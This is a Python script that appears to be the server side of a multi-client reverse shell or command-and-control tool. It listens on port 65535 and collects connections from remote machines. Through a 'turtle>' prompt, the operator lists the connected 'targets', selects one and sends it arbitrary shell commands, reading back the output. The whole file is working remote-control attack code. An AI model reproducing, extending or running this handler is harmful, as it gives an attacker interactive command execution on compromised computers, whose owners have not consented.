
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_address = []
all_connections = []


# Creating Socket
def create_socket():
	try:
		global host
		global port
		global sock

		host = ""
		port = 65535
		sock = socket.socket()
	
	except socket.error as msg:
		print(f"Socket Creating Error : {str(msg)}")
	

# Binding the socket and listening for connections
def bind_socket():
	try:
		global host
		global port
		global sock

		print(f"Binding to Port : {str(port)}")

		sock.bind((host,port))
		sock.listen(5)	
		print("Listening for Connections... ")

	except socket.error as msg:
		print(f"Socket Binding Error : {str(msg)} \nRetrying...")
		bind_socket()
		



# Handling connections from multiple clients and saving to a list
# Closing previous conncetions when server.py file is restarted

def accepting_connection():
	for c in all_connections:
		c.close()
	
	del all_connections[:]
	del all_address[:]

	while True:
		try:
			conn,address = sock.accept()
			sock.setblocking(1) # prevent Timeout
			
			all_connections.append(conn)
			all_address.append(address)
			
			print(f"Connection has been established : {address[0]}")
		
		except:
			print("Error accepting connections")
 

# 2nd thread functions -1) See all the clients 2)Select a client 3)Send commands to the connected Client
# Interactive prompt for sending commands
# turtle> list 
# 1 Friend-1 Port
# 2 Friend-2 Port
# 3 Friend-3 Port
# turtle> select 2
# 192.168.10.14>

def start_turtle():
	while True:
		cmd  = input("turtle>")

		if cmd == "list":
			list_connections()
	
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
	
		else:
			print("Command not recognized")


# Displays all current active connections with active client

def list_connections():
	results = ''
	
	for index,conn in enumerate(all_connections):
		try:
			conn.send(str.encode(" "))
			conn.recv(1010101)
		
		except:
			del all_connections[index]
			del all_address[index]
			continue
		
		results += str(index)+"   "+str(all_address[index][0])+"   "+str(all_address[index][1])+"\n"
	
	print("----------Clients------"+"\n"+results)



# Selecting the target

def get_target(cmd):
	try:
		target = cmd.replace("select ","")
		target = int(target)
		conn = all_connections[target]
		
		print(f"You are now connected to : {all_address[target][1]} ")
		print(str(all_address[target][0])+">",end = "")
		return conn

	except:
		print("Selection not Valid")
		return None


# Send commands to client

def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if cmd == "quit":
				break
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480),"utf-8")
				print(client_response, end="")
		except:
			print("Error Sending Commands")
			break

# Create worker Threads

def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()


# do next job that is in the queue (Handle Connections,send Commands)

def work():
	while True:
		x = queue.get()
		if x == 1:
			create_socket()
			bind_socket()
			accepting_connection()
	
		if x == 2:
			start_turtle()
		
		queue.task_done()
# Create jobs

def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()


create_workers()
create_jobs()
